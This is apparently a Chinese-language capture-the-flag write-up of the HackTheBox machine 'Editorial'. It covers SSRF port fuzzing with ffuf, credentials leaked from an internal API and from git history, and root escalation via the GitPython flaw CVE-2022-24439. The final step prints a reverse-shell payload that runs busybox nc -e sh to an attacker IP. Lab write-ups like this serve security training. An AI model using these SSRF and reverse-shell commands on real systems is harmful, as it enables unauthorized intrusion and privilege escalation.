---
title: "Editorial"
description: "这篇HackTheBox Linux 靶机 Editorial 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Editorial 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-23T00:19:00+08:00"
publishDate: "2024-10-23T00:19:00+08:00"
lastmod: "2024-10-23T00:19:00+08:00"
url: "/hackthebox/linux/editorial/"
image: "images/oscp-banners/banner-005.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器的端口进行扫描探测

```
sudo nmap -p- 10.10.11.20 -open
```

![image-20240920143433952](https://s2.loli.net/2024/09/20/T2Qp78y3ieDbrjt.png)

对开放端口进一步进行扫描

```
sudo nmap -p22,80 -A 10.10.11.20 -oX Editorial.xml
```

![image-20240920143524251](https://s2.loli.net/2024/09/20/L9zEcXxdFqZnIuY.png)

22端口根据能够扫描到的版本号没有可以进一步利用的方式方法，从80端口服务开始进行排查，优先添加hosts内容

```
dirsearch -u http://editorial.htb/
```

![image-20240920151143203](https://files.seeusercontent.com/2026/04/07/9nEs/image-20240920151143203.png)

在about页面

![image-20240920151327062](https://s2.loli.net/2024/09/20/7nCHEd1uJBYTvhM.png)

获取到一个邮箱submissions@tiempoarriba.htb，考虑是否存在新的hosts，进行添加，并没有发现其他新的内容

在upload页面，尝试进行文件上传，发现两个post接口

![image-20240920160907875](https://s2.loli.net/2024/09/20/cFUKXw65ogOD349.png)

在/upload-cover页面中，发现会固定返回静态页面图片/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg

![image-20240920161137390](https://s2.loli.net/2024/09/20/cEjsVnq2vAyIZt9.png)

在URL这个输入框内，可以输入链接进行http访问请求，故怀疑该点具备SSRF的漏洞，进行访问尝试

![image-20240920161232666](https://s2.loli.net/2024/09/20/vYcbFtwiKQUmL7T.png)

![image-20240920161241010](https://s2.loli.net/2024/09/20/Kwaz5mdk68lneZJ.png)

那么这个位置就可以访问本地127.0.0.1上的端口和服务

复制对应的request

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: editorial.htb' -H $'Content-Length: 305' -H $'Accept-Language: en-US' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5R863tFePk7xGCZB' -H $'Accept: */*' -H $'Origin: http://editorial.htb' -H $'Referer: http://editorial.htb/upload' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'------WebKitFormBoundary5R863tFePk7xGCZB\x0d\x0aContent-Disposition: form-data; name=\"bookurl\"\x0d\x0a\x0d\x0ahttp://127.0.0.1:29\x0d\x0a------WebKitFormBoundary5R863tFePk7xGCZB\x0d\x0aContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundary5R863tFePk7xGCZB--\x0d\x0a' \
    $'http://editorial.htb/upload-cover'
```

使用ffuf 进行改造,对127.0.0.1的各端口服务进行fuzzing

```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://editorial.htb/upload-cover -X $'POST' -H $'Host: editorial.htb' -H $'Content-Length: 305' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOJyVOcmgJAmiWi5b' -H $'Accept: */*' -H $'Origin: http://editorial.htb' -H $'Referer: http://editorial.htb/upload' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: keep-alive' \
    --data-binary $'------WebKitFormBoundaryOJyVOcmgJAmiWi5b\x0d\x0aContent-Disposition: form-data; name=\"bookurl\"\x0d\x0a\x0d\x0ahttp://127.0.0.1:FUZZ\x0d\x0a------WebKitFormBoundaryOJyVOcmgJAmiWi5b\x0d\x0aContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundaryOJyVOcmgJAmiWi5b--\x0d\x0a' -fs 61
```

扫描结果如下：

![image-20240920162022165](https://files.seeusercontent.com/2026/04/07/bpF3/image-20240920162022165.png)

5000端口存在内容，使用burp进行访问查看

![image-20240920162206051](https://s2.loli.net/2024/09/20/kDEQVvIUASbq7xr.png)

```
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

查询到对应的几个接口，继续使用5000端口进行查询

![image-20240920162607768](https://s2.loli.net/2024/09/20/3tyfdvBDYhKcqJW.png)

![image-20240920162702735](https://s2.loli.net/2024/09/20/1mtYlKSf9iFWHaE.png)

```
[{"2anniversaryTWOandFOURread4":{"contact_email_2":"info@tiempoarriba.oc","valid_until":"12/02/2024"}},{"frEsh11bookS230":{"contact_email_2":"info@tiempoarriba.oc","valid_until":"31/11/2023"}}]
```

![image-20240920162823710](https://s2.loli.net/2024/09/20/tXgDLApRsr5ya8v.png)

```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

在这段文字中，获取到一个用户和密码

username:dev

password:dev080217_devAPI!@

考虑到服务器具备22端口，尝试使用以上账号密码进行登录

![image-20240920163012470](https://s2.loli.net/2024/09/20/Tw2MKhYfukeUlOb.png)

成功突破边界，获取对应flag

![image-20240920163437548](https://s2.loli.net/2024/09/20/a5N1Lq2Gy34ISPB.png)

在apps文件夹下发现一个.git文件，开始逐步查看各配置项目

```
email = dev-carlos.valderrama@tiempoarriba.htb
name = dev-carlos.valderrama
```

![image-20240920164605556](https://s2.loli.net/2024/09/20/QwdsOv7k2MFLefH.png)

第三条的change值得关注

![image-20240920164655335](https://s2.loli.net/2024/09/20/UGILgu1dEvP3VlH.png)

结合现有的用户名，可以关注这条实际的变化

![image-20240920164813777](https://s2.loli.net/2024/09/20/almqXxvZkn3KWU5.png)

我们又发现了一个用户和密码

Username: prod

Password: 080217_Producti0n_2023!@

尝试进行用户切换

![image-20240920164906893](https://s2.loli.net/2024/09/20/gbYzikEATLdRa4K.png)

成功进行了横向移动

运行sudo -l

![image-20240920165005289](https://s2.loli.net/2024/09/20/m25HRnIDrwxbtOK.png)

![image-20240920165118922](https://s2.loli.net/2024/09/20/2MtOsxozmdgj63A.png)

想使用这个文件进行进一步提权没有其他办法，通过python脚本可以查看到引入了git库，通过pip3 list 查看对应的适用版本

![image-20240920173200266](https://s2.loli.net/2024/09/20/fzwT6NOy4Kkjxbh.png)

发现一个RCE CVE-2022-24439（https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858）

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c busybox% nc% 10.10.16.15% 1234% -e% sh'
```

![image-20240920175210209](https://s2.loli.net/2024/09/20/Ac91OU3DYT72SiP.png)

成功反弹回shell

